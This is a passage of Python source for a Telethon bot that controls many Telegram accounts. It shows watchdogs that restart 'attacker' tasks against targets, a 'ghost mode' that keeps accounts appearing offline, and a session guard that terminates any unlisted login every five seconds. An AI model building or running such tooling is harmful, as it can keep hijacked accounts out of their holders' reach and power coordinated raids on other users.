          except Exception:
              pass
      def flush_lines(self):
          lines = self._lines[:]
          self._lines.clear()
          return lines

    _mem_handler = _MemHandler()
    _mem_handler.setFormatter(_logging.Formatter("%(asctime)s %(message)s", datefmt="%H:%M:%S"))
    _logging.getLogger().addHandler(_mem_handler)

    _last_log_msg_id = None
    await asyncio.sleep(LOG_INTERVAL)

    while True:
      try:
          lines = _mem_handler.flush_lines()
          client = None
          if bot_client and bot_client.is_connected():
              client = bot_client
          elif main_client and main_client.is_connected():
              client = main_client
          if client and lines:
              now_str = datetime.now(IRAN_TZ).strftime("%Y-%m-%d_%H-%M")
              content = "\n".join(lines)
              buf = _io.BytesIO(content.encode("utf-8"))
              buf.name = f"log_{now_str}.txt"
              try:
                    if _last_log_msg_id:
                        try:
                            await client.delete_messages(OWNER_ID, [_last_log_msg_id])
                        except Exception:
                            pass
                    sent = await client.send_file(
                        OWNER_ID, buf,
                        caption=f" لاگ بات — {now_str}\n {len(lines)} خط",
                        force_document=True
                    )
                    _last_log_msg_id = sent.id
              except Exception as e:
                    log.warning(f"[log-reporter] send error: {e}")
      except Exception as e:
          log.warning(f"[log-reporter] loop error: {e}")
      await asyncio.sleep(LOG_INTERVAL)


async def attacker_watchdog_loop() -> None:
    """Every 30 seconds, restart any attacker tasks that died but are still marked active.
    Also cleans up stale pending_logins entries to prevent zombie client leaks."""
    await asyncio.sleep(60)
    _pending_login_ts: Dict[str, float] = {}  # key -> time.time() when first seen
    STALE_LOGIN_TTL = 1800  # 30 minutes

    while True:
      try:
          # ── owner-panel attackers (og_ prefix) ──────────────────
          loop_fn = _og_atk_loop_ref.get('fn')
          if loop_fn:
              for gname, ginfo in list(groups_db.items()):
                    atk = ginfo.get("attacker", {})
                    if not atk.get("active"):
                        continue
                    key = f"og_{gname}"
                    task = atk_tasks.get(key)
                    if task is None or task.done():
                        log.warning(f"[watchdog] og attacker '{gname}' dead but active — restarting")
                        atk_tasks[key] = asyncio.create_task(loop_fn(gname))

          # ── group-bot attackers (group_name key, no prefix) ──────
          for gname, grp_loop_fn in list(_grp_atk_loop_refs.items()):
              atk = groups_db.get(gname, {}).get("attacker", {})
              if not atk.get("active"):
                    continue
              if not atk.get("target") or not atk.get("items"):
                    continue
              task = atk_tasks.get(gname)
              if task is None or task.done():
                    log.warning(f"[watchdog] grp attacker '{gname}' dead but active — restarting")
                    atk_tasks[gname] = asyncio.create_task(grp_loop_fn())

          # ── stale pending_logins cleanup (prevent zombie TelegramClient leaks) ──
          now = time.time()
          for k in list(pending_logins.keys()):
              if k not in _pending_login_ts:
                    _pending_login_ts[k] = now
              elif now - _pending_login_ts[k] > STALE_LOGIN_TTL:
                    entry = pending_logins.pop(k, None)
                    _pending_login_ts.pop(k, None)
                    if entry:
                        tmp = entry.get("tmp")
                        if tmp and hasattr(tmp, "disconnect"):
                            try:
                                await tmp.disconnect()
                            except Exception:
                                pass
                        log.warning(f"[watchdog] cleaned up stale pending_login: {k}")
          # prune timestamps for keys no longer in pending_logins
          for k in list(_pending_login_ts.keys()):
              if k not in pending_logins:
                    _pending_login_ts.pop(k, None)

      except Exception as e:
          log.warning(f"[watchdog] error: {e}")
      await asyncio.sleep(30)

async def _ghost_apply_all() -> None:
    """یک‌بار UpdateStatus(offline=True) رو به همه کلاینت‌های متصل می‌زنه — به‌صورت موازی."""
    from telethon.tl.functions.account import UpdateStatusRequest
    all_clients: list = []
    for meta in list(managed.values()):
        c = meta.get("client")
        if c and c.is_connected():
            all_clients.append(c)
    for c in list(_protected_clients.values()):
        if c and c.is_connected():
            all_clients.append(c)
    if main_client and main_client.is_connected() and main_client not in all_clients:
        all_clients.append(main_client)

    async def _one(c):
        async with _TG_API_SEM:
            try:
                await c(UpdateStatusRequest(offline=True))
            except Exception:
                pass

    if all_clients:
        await asyncio.gather(*[_one(c) for c in all_clients], return_exceptions=True)

async def global_session_guard() -> None:
    """
    گارد دائمی session — هر ۵ ثانیه همه سشن‌های آنلاین و protected رو اسکن می‌کنه.
    - hash=0 (کانکشن فعلی هر کلاینت) هرگز terminate نمیشه
    - هش‌هایی که در baseline بودن (موقع start گارد) هرگز terminate نمیشن
    - Trusted Devices هم هرگز terminate نمیشن — فقط whitelist میشن
    - هر هش جدیدی که نه در baseline باشه، نه trusted باشه → terminate + notify owner
    """
    from telethon.tl.functions.account import (
      GetAuthorizationsRequest,
      ResetAuthorizationRequest,
    )

    authorized_hashes: Dict[str, set] = {}   # sn → set of whitelisted non-zero hashes
    terminating: Dict[str, set] = {}          # sn → hashes in-progress terminate

    def _fld(val: str, trust: str) -> bool:
      return bool(val and trust and (trust in val or val in trust))

    def _is_trusted(dm: str, dp: str, da: str) -> bool:
      """
      Trusted اگه:
      • device_model match بده (به تنهایی)، یا
      • platform + app_name هر دو match بدن، یا
      • platform match بده و app_name در trusted خالی باشه
      """
      for t in TRUSTED_GUARD_DEVICES:
          t_dm = (t.get("device_model", "") or "").lower()
          t_dp = (t.get("platform", "") or "").lower()
          t_da = (t.get("app_name", "") or "").lower()
          if _fld(dm, t_dm):
              return True
          if _fld(dp, t_dp) and _fld(da, t_da):
              return True
          if _fld(dp, t_dp) and not t_da:
              return True
      return False

    async def _do_terminate(sn: str, c, h: int, auth_obj) -> None:
      # ╔══ ایمنی مضاعف — حتی اگه بیرون از _do_terminate چک نشده باشه ══╗
      if h == 0:                             # hash=0 = کانکشن فعلی ربات → هرگز
          return
      _dm2 = (getattr(auth_obj, "device_model", "") or "").lower()
      _dp2 = (getattr(auth_obj, "platform", "") or "").lower()
      _da2 = (getattr(auth_obj, "app_name", "") or "").lower()
      if _is_trusted(_dm2, _dp2, _da2):     # Trusted Device → هرگز
          authorized_hashes.setdefault(sn, set()).add(h)
          return
      # ╚══════════════════════════════════════════════════════════════╝
      device   = getattr(auth_obj, "device_model", "?")
      platform = getattr(auth_obj, "platform", "?")
      app      = getattr(auth_obj, "app_name", "?")
      country  = getattr(auth_obj, "country", "?")
      try:
          await c(ResetAuthorizationRequest(hash=h))
          status = "✅ terminate شد"
      except Exception as _te:
          status = f"❌ {str(_te)[:50]}"
      notify = (
          f"🛡 <b>Session Guard — نشست جدید شناسایی شد</b>\n"
          f"اکانت: <b>{sn}</b>\n"
          f"📱 دستگاه: {device} / {platform}\n"
          f"📦 اپ: {app}\n"
          f"🌍 کشور: {country}\n"
          f"━━━━━━━━━━━━━━\n"
          f"نتیجه: {status}"
      )
       # اطلاع به صاحب مین (owner) ربات
      try:
          await bot_client.send_message(OWNER_ID, notify, parse_mode="html")
      except Exception:
          try:
              await main_client.send_message(OWNER_ID, notify, parse_mode="html")
          except Exception:
              pass
      # اطلاع به صاحب ریموت‌هایی که این سشن توشونه
      _grp_names = _sess_grp_map.get(sn, [])
      _notified_owners: set = {OWNER_ID}
      for _gn in _grp_names:
          _g_owner = int(groups_db.get(_gn, {}).get("owner", 0))
          if _g_owner and _g_owner not in _notified_owners:
              _notified_owners.add(_g_owner)
              try:
                  await bot_client.send_message(_g_owner, notify, parse_mode="html")
              except Exception:
                  pass

    # ── baseline: همه هش‌های فعلی رو whitelist کن ──
    _all_baseline = dict(managed)
    for sn, pc in _protected_clients.items():
      if sn not in _all_baseline:
          _all_baseline[sn] = {"client": pc}
    for sn, meta in list(_all_baseline.items()):
      c = meta.get("client")
      if not c:
          continue
      for _attempt in range(3):
          try:
              result = await c(GetAuthorizationsRequest())
              authorized_hashes[sn] = {
                    a.hash for a in result.authorizations if a.hash != 0
              }
              break
          except Exception:
              if _attempt < 2:
                    await asyncio.sleep(2)
      await asyncio.sleep(0.2)

    try:
      await bot_client.send_message(
          OWNER_ID,
          f"🛡 <b>Session Guard فعال شد</b>\n"
          f"• هر ۵ ثانیه نشست‌های غیرمجاز شناسایی و فوری terminate می‌شن\n"
          f"• hash=0 (نشست فعلی هر کلاینت) هرگز دست نمیخوره\n"
          f"• Trusted Devices هرگز terminate نمیشن\n"
          f"• {len(managed)} اکانت آنلاین + {len(_protected_clients)} اکانت خاموش protected",
          parse_mode="html"
      )
    except Exception:
      pass

    # ── per-session guard coroutine (runs under shared semaphore) ──────────
    async def _guard_one(sn: str, meta: dict) -> None:
        if sn in (MAIN_SESSION, "bot_session"):
            return
        # ── از reverse index بخون (O(1) به جای O(groups)) ──
        _sn_in_any = sn in _sess_grp_map
        # فقط سشن‌هایی که ریموتشون صریحاً guard را روشن کرده گارد می‌شن
        _sn_guard  = _sess_grp_guard.get(sn, False)
        if not _sn_guard:
            return
        _sn_group_td = _sess_grp_td.get(sn, [])
        c = meta.get("client")
        if not c:
            return
        async with _TG_API_SEM:
            # سشن جدید → baseline
            if sn not in authorized_hashes:
                try:
                    result = await asyncio.wait_for(c(GetAuthorizationsRequest()), timeout=15)
                    authorized_hashes[sn] = {
                        a.hash for a in result.authorizations if a.hash != 0
                    }
                except Exception:
                    pass
                return
            try:
                result   = await asyncio.wait_for(c(GetAuthorizationsRequest()), timeout=15)
                auth_map = {a.hash: a for a in result.authorizations}
                ok       = authorized_hashes[sn]
                terminating.setdefault(sn, set())
                current_hashes = set(auth_map.keys())

                for h, auth_obj in auth_map.items():
                    if h == 0:
                        continue
                    if h in ok:
                        continue
                    dev_m = (getattr(auth_obj, "device_model", "") or "").lower()
                    dev_p = (getattr(auth_obj, "platform", "") or "").lower()
                    dev_a = (getattr(auth_obj, "app_name", "") or "").lower()
                    if _is_trusted(dev_m, dev_p, dev_a):
                        authorized_hashes[sn].add(h)
                        continue
                    _pg_trusted = any(
                        _fld(dev_m, (t.get("device_model", "") or "").lower()) or
                        (_fld(dev_p, (t.get("platform", "") or "").lower()) and
                         _fld(dev_a, (t.get("app_name", "") or "").lower()))
                        for t in _sn_group_td
                    )
                    if _pg_trusted:
                        authorized_hashes[sn].add(h)
                        continue
                    if h not in terminating[sn]:
                        await _do_terminate(sn, c, h, auth_obj)
                        terminating[sn].add(h)
                    else:
                        try:
                            await c(ResetAuthorizationRequest(hash=h))
                        except Exception:
                            pass

                terminating[sn] -= (terminating[sn] - current_hashes)

            except asyncio.CancelledError:
                raise
            except Exception:
                pass

    # ── polling loop (موازی — همه سشن‌ها با هم، محدود به _TG_API_SEM) ──
    while SESSION_GUARD_ENABLED:
        await asyncio.sleep(5)
        if not SESSION_GUARD_ENABLED:
            break
        _scan = dict(managed)
        for _sn, _pc in list(_protected_clients.items()):
            if _sn not in _scan:
                _scan[_sn] = {"client": _pc}
        if _scan:
            await asyncio.gather(
                *[_guard_one(sn, meta) for sn, meta in list(_scan.items())],
                return_exceptions=True,
            )

async def protected_clients_watchdog() -> None:
    """هر ۶۰ ثانیه protected client های قطع‌شده رو دوباره وصل می‌کنه (burn/guard روی سشن‌های خاموش)."""
    await asyncio.sleep(120)  # صبر تا سشن‌های اصلی لود بشن
    while True:
      try:
          if OTP_BURN_MODE or SESSION_GUARD_ENABLED:
              for sess in list(manually_disabled):
                    if sess in managed:
                        continue  # الان managed شده — protected لازم نیست
                    pc = _protected_clients.get(sess)
                    if pc and pc.is_connected():
                        continue  # سالمه
                    # قطع‌شده یا اصلاً وجود نداره — reconnect
                    if pc:
                        _protected_clients.pop(sess, None)
                        try:
                            await pc.disconnect()
                        except Exception:
                            pass
                    asyncio.create_task(start_protected_client_safe(sess))
      except Exception as _e:
          log.warning(f"[protected_watchdog] error: {_e}")
      await asyncio.sleep(60)

async def _db_flush_loop() -> None:
    """هر ۵۰۰ms dirty flag رو چک می‌کنه و اگه نیاز بود DB رو می‌نویسه.
    - sessions_db (بزرگ): در thread executor تا event loop block نشه
    - groups_db (کوچک، شامل _rebuild_sess_grp_index): روی event loop تا race نباشه
    """
    import concurrent.futures as _cf
    _exec = _cf.ThreadPoolExecutor(max_workers=1, thread_name_prefix="db-flush")
    loop = asyncio.get_event_loop()
    global _db_dirty, _groups_dirty
    while True:
        await asyncio.sleep(0.5)
        try:
            if _db_dirty:
                _db_dirty = False
                await loop.run_in_executor(_exec, save_db)   # thread: فقط فایل نویسی
            if _groups_dirty:
                _groups_dirty = False
                save_groups()   # event loop: شامل _rebuild_sess_grp_index — thread-safe
        except Exception as _fe:
            log.warning(f"[db_flush] error: {_fe}")

async def ghost_mode_loop() -> None:
    """هر ۳۰ ثانیه وقتی Ghost Mode روشنه، UpdateStatus(offline=True) رو به همه اکانت‌ها میزنه."""
    while True:
      try:
          if GHOST_MODE:
              await _ghost_apply_all()
      except Exception as e:
          log.warning(f"[ghost_mode_loop] error: {e}")
      await asyncio.sleep(30)

async def auto_reconnect_loop() -> None:
    """Reconnect dropped sessions with per-session exponential backoff."""
    await asyncio.sleep(60)
    _fail_count: Dict[str, int] = {}   # sess -> consecutive fail count
    _next_retry: Dict[str, float] = {} # sess -> earliest retry epoch
    BASE_INTERVAL = 60                 # 1 min base check cycle

    while True:
      try:
          now = time.time()
          for sess, info in list(sessions_db.items()):
              if sess in manually_disabled:
                    continue
              # سشن‌های سیستمی — توسط main() مدیریت میشن، نه auto-reconnect
              if sess in (MAIN_SESSION, "bot_session"):
                    continue
              if sess in managed:
                    _fail_count.pop(sess, None)  # connected — reset backoff
                    _next_retry.pop(sess, None)
                    continue
              # exponential backoff: skip if not yet time to retry
              if now < _next_retry.get(sess, 0):
                    continue
              try:
                    await start_worker(sess, phone=info.get("phone"))
                    if sess in managed:
                        log.warning(f"[auto-reconnect] {sess} reconnected")
                        _fail_count.pop(sess, None)
                        _next_retry.pop(sess, None)
                    else:
                        raise RuntimeError("not in managed after start_worker")
              except Exception as e:
                    fails = _fail_count.get(sess, 0) + 1
                    _fail_count[sess] = fails
                    # backoff: 3min, 6min, 12min, 24min, 48min, max 2h
                    backoff = min(BASE_INTERVAL * (2 ** (fails - 1)), 7200)
                    _next_retry[sess] = now + backoff
                    log.warning(f"[auto-reconnect] {sess} failed (attempt {fails}, retry in {backoff:.0f}s): {e}")

          # also heal any connected-but-disconnected clients
          for meta in list(managed.values()):
              try:
                    client = meta["client"]
                    if not client.is_connected():
                        await client.connect()
              except Exception:
                    pass
      except Exception as e:
          log.warning(f"[auto-reconnect] loop error: {e}")
      await asyncio.sleep(BASE_INTERVAL)

if __name__ == "__main__":
    import time
    while True:
      try:
          asyncio.run(main())
      except (KeyboardInterrupt, SystemExit):
          print("Exiting...")
          break
      except Exception as e:
          print(f"[AUTO-RESTART] Bot crashed: {e} — restarting in 10 seconds...")
          time.sleep(10)
